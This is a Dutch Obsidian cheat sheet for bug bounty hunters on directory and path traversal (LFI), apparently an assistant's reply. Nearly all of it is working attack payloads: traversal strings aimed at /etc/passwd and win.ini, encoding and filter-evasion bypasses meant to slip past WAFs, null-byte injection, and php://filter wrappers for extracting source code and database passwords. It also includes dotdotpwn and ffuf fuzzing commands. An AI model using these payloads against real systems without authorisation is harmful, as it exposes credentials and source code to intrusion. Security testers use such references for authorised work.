
Hier is de complete Obsidian notitie voor **Directory Traversal** (ook bekend als Path Traversal of LFI).

Dit is een favoriet bij bug hunters omdat het vaak leidt tot **P1 (Critical)** meldingen als je configuratiebestanden of broncode kunt lezen.

Kopieer dit blok direct in je Obsidian vault:

Markdown

````
# 📂 Directory / Path Traversal (LFI)

==Doel: Bestanden lezen op de server buiten de webroot map.==


---

## 🌐 1. Adresbalk (Basic Payloads)
*Probeer deze direct in de browser als je een bestandsnaam ziet in de URL (bijv. `?page=contact.php` of `?image=logo.png`).*

### Linux Targets (Meest voorkomend)
Het doel is `/etc/passwd` te bereiken om gebruikersnamen te zien.

```text
../../../../etc/passwd
../../../../../etc/passwd
/etc/passwd
````

### Windows Targets

Het doel is `win.ini` of `boot.ini`.

Plaintext

```
../../../../windows/win.ini
../../../../winnt/win.ini
c:/windows/win.ini
```

### Absolute Path (Zonder puntjes)

Soms werkt de server direct vanaf de root `/`.

Plaintext

```
/etc/passwd
/var/www/html/index.php
```

---

## 🟧 2. Burp Suite & Bypasses (Advanced)

_Als de simpele `../` wordt geblokkeerd door een WAF of filter, gebruik je Burp Repeater/Intruder met deze trucs._

### URL Encoding (WAF Bypass)

Browsers doen dit soms automatisch, maar in Burp moet je het handmatig doen (`Ctrl+U`).

**Standaard URL Encode:**

Plaintext

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Double URL Encode (Krachtig!):** _Als de server één keer decodeert en de WAF ook, kan dit er doorheen glippen._

Plaintext

```
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Filter Evasion (Stripping)

Als de server `../` vervangt door "niets", gebruik dan geneste karakters. _Server logic: `....//` -> haalt `../` weg -> blijft over: `../`_

Plaintext

```
....//....//....//etc/passwd
..././..././..././etc/passwd
..\..\..\..\windows\win.ini
```

### Null Byte Injection (Alleen oude systemen/Java)

Sommige talen stoppen met lezen na een `%00`. Dit helpt als de server `.php` achter je input plakt. _Server verwacht: `bestand` + `.php`. Jij geeft: `passwd%00` + `.php` -> Server leest alleen `passwd`._

Plaintext

```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
```

---

## 🔮 3. PHP Wrappers (Source Code Reading)

==Dit is de heilige graal voor Bug Bounty!== Als je een bestand kunt includen maar het wordt uitgevoerd (je ziet de tekst niet), gebruik dan deze wrapper om de **broncode in Base64** te krijgen.

**Payload:**

Plaintext

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```

**Stappen:**

1. Voer payload in (bijv `?page=...`).
    
2. Je krijgt een lange string: `PD9waHAgZWNoby...`.
    
3. Ga naar Burp Decoder (of typ `echo "STRING" | base64 -d` in terminal).
    
4. Nu lees je de backend code (inclusief database wachtwoorden!).
    

---

## 🤖 4. Automation Tools

**DotDotPwn (De klassieker)** Een specifieke fuzzer voor traversal.

Bash

```
dotdotpwn -m http -h target.com -M GET -f /etc/passwd
```

**FFUF (Fuzzing)** Gebruik een wordlist met LFI payloads.

Bash

```
ffuf -u [https://target.com/image?filename=FUZZ](https://target.com/image?filename=FUZZ) -w /path/to/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:"
```

_(De `-mr "root:"` zorgt dat hij alleen melding geeft als de tekst "root:" in de response staat, wat bewijst dat `/etc/passwd` is gevonden)._

---

## 📝 Checklist LFI

- [ ] **OS Check:** Is het Linux (`/etc/passwd`) of Windows (`c:\windows\win.ini`)?
    
- [ ] **Diepte:** Heb ik genoeg `../` gebruikt? Probeer er eens 10.
    
- [ ] **Wrappers:** Heb ik `php://filter` geprobeerd voor source code?
    
- [ ] **RFI Check:** Kan ik ook externe sites laden? (`?page=http://google.com`). Zo ja -> Critical (RCE mogelijk).